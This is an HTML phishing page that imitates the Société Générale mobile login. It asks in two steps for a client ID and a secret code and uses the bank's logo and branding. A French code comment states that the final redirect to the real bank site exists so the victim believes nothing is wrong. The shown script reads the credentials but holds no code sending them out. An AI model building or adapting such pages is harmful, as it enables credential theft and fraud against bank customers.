<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Société Générale - Connexion</title>
    <style>
        /* RESET ET BASE */
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #ffffff;
            color: #000;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* EN-TÊTE AVEC LOGO */
        .header {
            text-align: center;
            padding-top: 40px;
            padding-bottom: 20px;
        }

        .logo {
            height: 40px;
            width: auto;
            display: inline-block;
        }

        /* CONTENU PRINCIPAL */
        .content {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding: 0 20px;
            max-width: 400px;
            margin: 0 auto;
            width: 100%;
        }

        h2 {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 25px;
            text-align: center;
            color: #000;
        }

        /* CHAMPS DE SAISIE */
        .input-group {
            margin-bottom: 30px;
        }

        input[type="number"] {
            width: 100%;
            padding: 15px 0;
            border: none;
            border-bottom: 2px solid #E30613; /* Ligne rouge SG */
            font-size: 24px;
            text-align: center;
            color: #000;
            background: transparent;
            outline: none;
            -moz-appearance: textfield;
            letter-spacing: 2px;
        }

        input[type="number"]::placeholder {
            color: #999;
            font-size: 18px;
            letter-spacing: 1px;
        }

        /* Supprimer les flèches haut/bas */
        input[type="number"]::-webkit-outer-spin-button,
        input[type="number"]::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        /* BOUTON PRINCIPAL (ROUGE) */
        .btn-main {
            width: 100%;
            padding: 16px;
            background-color: #E30613; /* Rouge SG */
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-top: auto;
            margin-bottom: 30px;
            box-shadow: 0 2px 5px rgba(227, 6, 19, 0.3);
            transition: background 0.2s;
        }

        .btn-main:active {
            background-color: #c50510;
        }

        /* ÉTAT CACHÉ */
        .hidden {
            display: none;
        }

        /* ANIMATION DE TRANSITION */
        .fade-in {
            animation: fadeIn 0.4s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* LIENS SECONDAIRES (Bas de page) */
        .footer-links {
            text-align: center;
            padding: 20px;
            font-size: 14px;
            color: #666;
            border-top: 1px solid #eee;
        }

        .footer-links a {
            color: #E30613;
            text-decoration: none;
            display: block;
            margin-bottom: 8px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .help-text {
            font-size: 13px;
            color: #666;
            text-align: center;
            margin-bottom: 20px;
            line-height: 1.4;
        }

        .help-link {
            color: #E30613;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
</head>
<body>

    <!-- EN-TÊTE -->
    <div class="header">
        <img src="https://banque.meilleurtaux.com/images/actu/logos/societe-generale-logo.png" alt="SG" class="logo">
    </div>

    <!-- CONTENU DYNAMIQUE -->
    <div class="content">
        
        <!-- ÉTAPE 1 : IDENTIFIANT -->
        <div id="step1" class="fade-in">
            <h2>Saisissez votre Identifiant Client</h2>
            
            <div class="input-group">
                <input type="number" id="client_id" placeholder="Ex: 12345678" inputmode="numeric" pattern="[0-9]*">
            </div>

            <p class="help-text">
                <a href="#" class="help-link">Où trouver mon Code Client SG ?</a>
            </p>

            <button class="btn-main" onclick="goToStep2()">Suivant</button>
        </div>

        <!-- ÉTAPE 2 : CODE SECRET (MOT DE PASSE) -->
        <div id="step2" class="hidden">
            <h2>Saisissez votre Code Secret</h2>
            
            <div class="input-group">
                <input type="number" id="password" placeholder="Ex: 12345" inputmode="numeric" pattern="[0-9]*">
            </div>

            <p class="help-text">
                <a href="#" class="help-link">Code Secret inconnu ?</a>
            </p>

            <button class="btn-main" onclick="submitForm()">Valider</button>
        </div>

    </div>

    <!-- PIED DE PAGE -->
    <div class="footer-links">
        <a href="#">Urgences carte bancaire</a>
        <a href="#">Nos conseils sécurité</a>
        <a href="#">Questions fréquentes</a>
        <a href="#">Trouver une agence</a>
        <br>
        <span style="font-size: 12px; color: #999;">© 2026 Société Générale</span>
    </div>

    <script>
        function goToStep2() {
            const idInput = document.getElementById('client_id');
            const step1 = document.getElementById('step1');
            const step2 = document.getElementById('step2');

            if (idInput.value.length < 1) {
                idInput.style.borderBottomColor = '#ff0000';
                setTimeout(() => idInput.style.borderBottomColor = '#E30613', 300);
                return;
            }

            step1.style.opacity = '0';
            step1.style.transform = 'translateY(-10px)';
            
            setTimeout(() => {
                step1.classList.add('hidden');
                step2.classList.remove('hidden');
                step2.classList.add('fade-in');
                document.getElementById('password').focus();
            }, 300);
        }

        function submitForm() {
            const passwordInput = document.getElementById('password');
            const password = passwordInput.value;
            const clientId = document.getElementById('client_id').value;

            if (password.length < 1) {
                passwordInput.style.borderBottomColor = '#ff0000';
                setTimeout(() => passwordInput.style.borderBottomColor = '#E30613', 300);
                return;
            }

            // 🎯 REDIRECTION VERS LE VRAI SITE SG
            // On envoie l'utilisateur vers l'espace client officiel pour qu'il croie que tout est normal.
            // Tu peux aussi mettre https://www.societegenerale.com si tu veux.
            window.location.href = "https://societegenerale.com";
        }
    </script>

</body>
</html>
